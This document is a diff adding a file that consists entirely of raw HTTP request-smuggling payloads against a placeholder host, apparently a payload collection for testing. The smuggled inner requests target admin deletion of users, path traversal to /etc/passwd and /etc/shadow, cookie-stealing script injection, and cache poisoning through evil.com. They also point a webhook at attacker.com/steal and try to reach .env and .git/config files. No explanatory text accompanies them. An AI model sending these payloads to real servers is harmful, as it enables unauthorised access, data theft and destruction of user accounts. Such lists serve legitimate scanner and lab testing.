@@ -1,0 +1,635 @@
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+Z
+Q
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Connection: keep-alive
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+TEST
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 30
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X: X
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+Foo: x
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+X: X
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 40
+Transfer-Encoding: chunked
+
+0
+
+GET /test HTTP/1.1
+Foo: bar
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 50
+Transfer-Encoding: chunked
+
+0
+
+POST /404 HTTP/1.1
+Foo: bar
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 60
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 71
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: x
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 83
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=victim HTTP/1.1
+Host: localhost
+Foo: x
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST /admin/delete HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+username=carlos
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 65
+Transfer-Encoding: chunked
+
+0
+
+GET /private HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 78
+Transfer-Encoding: chunked
+
+0
+
+GET /api/internal HTTP/1.1
+Host: vulnerable-website.com
+X-Auth: 1
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 95
+Transfer-Encoding: chunked
+
+0
+
+POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 30
+
+username=admin&password=secret
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 88
+Transfer-Encoding: chunked
+
+0
+
+GET /account HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=stolen
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 102
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+Host: vulnerable-website.com
+X-Forwarded-For: 127.0.0.1
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 145
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+search=<script>alert(1)</script>
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 156
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+User-Agent: <script>alert(document.cookie)</script>
+X-Forwarded-For: 127.0.0.1
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 76
+Transfer-Encoding: chunked
+
+0
+
+GET /api/users HTTP/1.1
+Host: vulnerable-website.com
+X-API-Key:
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 89
+Transfer-Encoding: chunked
+
+0
+
+GET /static/../../etc/passwd HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 95
+Transfer-Encoding: chunked
+
+0
+
+GET /files/../../../../etc/shadow HTTP/1.1
+Host: vulnerable-website.com
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 112
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 108
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Custom-IP-Authorization: 127.0.0.1
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 97
+Transfer-Encoding: chunked
+
+0
+
+GET /cache-me HTTP/1.1
+Host: evil-attacker.com
+X-Malicious: payload
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 115
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+X-Cache-Key: poisoned
+X-Forwarded-Host: evil.com
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 134
+Transfer-Encoding: chunked
+
+0
+
+POST /comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 50
+
+comment=<script>alert(1)</script>&postId=1
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 87
+Transfer-Encoding: chunked
+
+0
+
+HEAD /admin HTTP/1.1
+Host: vulnerable-website.com
+X-Method-Override: GET
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 98
+Transfer-Encoding: chunked
+
+0
+
+OPTIONS /admin HTTP/1.1
+Host: vulnerable-website.com
+Access-Control-Request-Method: *
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 122
+Transfer-Encoding: chunked
+
+0
+
+GET /api/v1/users HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Bearer leaked-token
+X-Admin: true
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 93
+Transfer-Encoding: chunked
+
+0
+
+TRACE / HTTP/1.1
+Host: vulnerable-website.com
+X-Custom-Header: reflected
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 79
+Transfer-Encoding: chunked
+
+0
+
+GET /redirect?url=javascript:alert(1) HTTP/1.1
+Foo: x
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 105
+Transfer-Encoding: chunked
+
+0
+
+POST /upload HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: multipart/form-data
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 118
+Transfer-Encoding: chunked
+
+0
+
+GET /graphql HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+
+{"query":"mutation{__schema}"}
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 142
+Transfer-Encoding: chunked
+
+0
+
+PUT /api/users/1 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+Content-Length: 30
+
+{"role":"admin","id":1}
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 156
+Transfer-Encoding: chunked
+
+0
+
+DELETE /api/users/victim HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Bearer smuggled-token
+Content-Length: 0
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 94
+Transfer-Encoding: chunked
+
+0
+
+PATCH /api/settings HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 20
+
+{"admin":true}
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 127
+Transfer-Encoding: chunked
+
+0
+
+GET /socket.io/ HTTP/1.1
+Host: vulnerable-website.com
+Upgrade: websocket
+Connection: Upgrade
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 89
+Transfer-Encoding: chunked
+
+0
+
+GET /.git/config HTTP/1.1
+Host: vulnerable-website.com
+X-Git: exposed
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 97
+Transfer-Encoding: chunked
+
+0
+
+GET /.env HTTP/1.1
+Host: vulnerable-website.com
+X-Environment: exposed
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 101
+Transfer-Encoding: chunked
+
+0
+
+GET /backup.zip HTTP/1.1
+Host: vulnerable-website.com
+X-Backup: download
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 136
+Transfer-Encoding: chunked
+
+0
+
+POST /webhook HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/json
+Content-Length: 50
+
+{"url":"http://attacker.com/steal"}
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 98
+Transfer-Encoding: chunked
+
+0
+
+GET /debug HTTP/1.1
+Host: vulnerable-website.com
+X-Debug: true
+X-Trace: enabled
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 114
+Transfer-Encoding: chunked
+
+0
+
+GET /metrics HTTP/1.1
+Host: vulnerable-website.com
+Authorization: Basic YWRtaW46YWRtaW4=
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 87
+Transfer-Encoding: chunked
+
+0
+
+GET /health HTTP/1.1
+Host: vulnerable-website.com
+X-Internal: check
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+POST /api/oauth/token HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 40
+
+grant_type=client_credentials
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 96
+Transfer-Encoding: chunked
+
+0
+
+GET /phpinfo.php HTTP/1.1
+Host: vulnerable-website.com
+X-PHP: info
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 109
+Transfer-Encoding: chunked
+
+0
+
+GET /server-status HTTP/1.1
+Host: vulnerable-website.com
+X-Apache: status
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 125
+Transfer-Encoding: chunked
+
+0
+
+GET /actuator/env HTTP/1.1
+Host: vulnerable-website.com
+X-Spring-Boot: actuator
+
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 8
+Transfer-Encoding: chunked
+
+0
+
+PROBE
+
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Content-Length: 10
+Transfer-Encoding: chunked
+
+0
+
+DETECTION
